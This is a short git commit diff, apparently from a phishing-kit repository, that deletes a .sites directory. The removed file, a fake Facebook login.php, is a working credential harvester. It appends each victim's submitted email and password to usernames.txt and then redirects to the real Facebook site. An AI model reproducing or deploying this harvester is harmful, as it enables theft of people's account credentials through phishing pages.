e85f976781df4b6f7680893da703af42cdb85bdf
Mike Edwards <82988362+mike90s15@users.noreply.github.com>
2022-09-14 11:29:38 -0300

    Delete .sites directory

--- .sites/facebook/login.php
+++
@@ -1,5 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", "\e[1;34m Conta: \e[0;32m" . $_POST['email'] . "\n\e[1;34m Senha: \e[0;32m" . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: https://facebook.com/');
-exit();
